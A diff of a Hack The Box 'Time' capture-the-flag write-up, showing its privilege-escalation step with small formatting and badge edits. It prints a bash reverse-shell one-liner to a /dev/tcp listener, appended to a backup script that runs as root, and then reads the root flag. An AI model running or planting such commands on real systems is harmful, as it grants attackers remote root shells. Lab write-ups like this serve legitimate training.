@@ -111,7 +111,7 @@ zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
 ```
 > **It's create a zip archive from /var/www/html and moving it to /root/backup.zip**
 
-> **So we have two ways to solve this situation, First add our public key to the authorized keys for root in Time Box and connect via ssh, but NO TIME so i choosed the second choice by getting reverse shell via bash shell ```echo "bash -i >& /dev/tcp/YOUR_MACHINE_IP/YOUR_NC_LISTNER_PORT 0>&1" >>/usr/bin/timer_backup.sh``` **
+> **So we have two ways to solve this situation, First add our public key to the authorized keys for root in Time Box and connect via ssh, but NO TIME so i choosed the second choice by getting reverse shell via bash shell ```echo "bash -i >& /dev/tcp/YOUR_MACHINE_IP/YOUR_NC_LISTNER_PORT 0>&1" >>/usr/bin/timer_backup.sh```**
 
 ```bash
 pericles@time:/usr/bin$ echo "bash -i >& /dev/tcp/10.10.16.11/4321 0>&1" >>/usr/bin/timer_backup.sh
@@ -131,7 +131,8 @@ cat /root/root.txt
 ```
 # RooTed
 
-<script src="https://www.hackthebox.eu/badge/209461"></script>
+<img src="http://www.hackthebox.eu/badge/image/209461" alt="Hack The Box">
+
 
 
 
